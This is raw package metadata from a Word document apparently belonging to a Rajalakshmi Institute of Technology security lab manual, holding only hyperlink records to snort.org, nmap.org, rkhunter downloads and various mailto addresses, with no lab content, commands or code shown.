Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:jn@rajalakshmi.edu.in" TargetMode="External" /><Relationship Id="rId54" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@kali:~" TargetMode="External" /><Relationship Id="rId62" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId70" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId75" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId83" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://downloads.sourceforge.net/project/" TargetMode="External" /><Relationship Id="rId88" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId91" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost"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mailto:root@localhost" TargetMode="External" /><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId36" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId49" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId57" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@kali:~" TargetMode="External" /><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId44" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:jn@rajalakshmi.edu.in" TargetMode="External" /><Relationship Id="rId52" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://nmap.org" TargetMode="External" /><Relationship Id="rId60" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@kali:~" TargetMode="External" /><Relationship Id="rId65" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId73" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId78" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId81" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://downloads.sourceforge.net/project/rkhunter/rkhunter/1.4.2/" TargetMode="External" /><Relationship Id="rId86" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId94"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root@localh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9266</Words>
  <Characters>52818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RAJALAKSHMI INSTITUTE OF TECHNOLOGY, CHENNAI</vt:lpstr>
    </vt:vector>
  </TitlesOfParts>
  <Company/>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>61961</CharactersWithSpaces>
  <SharedDoc>false</SharedDoc>
  <HLinks>
    <vt:vector size="498" baseType="variant">
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>246</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>243</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>240</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>237</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>234</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>231</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>228</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>225</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>222</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>4587586</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>219</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>http://downloads.sourceforge.net/project/</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>216</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>5701707</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>213</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>http://downloads.sourceforge.net/project/rkhunter/rkhunter/1.4.2/</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>210</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>5963807</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>207</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>http://www.yahoo.com/</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>204</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>201</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>198</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>195</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>192</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>189</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>186</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>5963858</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>183</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>http://www.snort.org/contact</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>team</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>180</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>177</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>174</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>171</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>168</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>165</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>162</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>4653143</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>159</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>http://www.snort.org/downloads/snort/snort-2.9.8.3.tar.gz</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>156</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>153</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>4784236</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>150</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@kali:~</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>4784236</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>147</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@kali:~</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>4784236</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>144</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@kali:~</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>4784236</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>141</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@kali:~</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>4784236</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>138</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@kali:~</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>4784236</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>135</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@kali:~</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>4784236</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>132</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@kali:~</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>4784236</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>129</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@kali:~</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>5701660</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>126</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>http://nmap.org/</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>123</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>120</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>117</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>114</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>111</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>3997763</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>108</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:jn@rajalakshmi.edu.in</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>105</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>3997763</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>102</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:jn@rajalakshmi.edu.in</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>99</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>3997763</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>96</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:jn@rajalakshmi.edu.in</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>3997763</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>93</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:jn@rajalakshmi.edu.in</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>6881371</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>90</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:heinrichh@duesseldorf.de</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>87</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>84</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>81</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>78</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>75</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>72</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
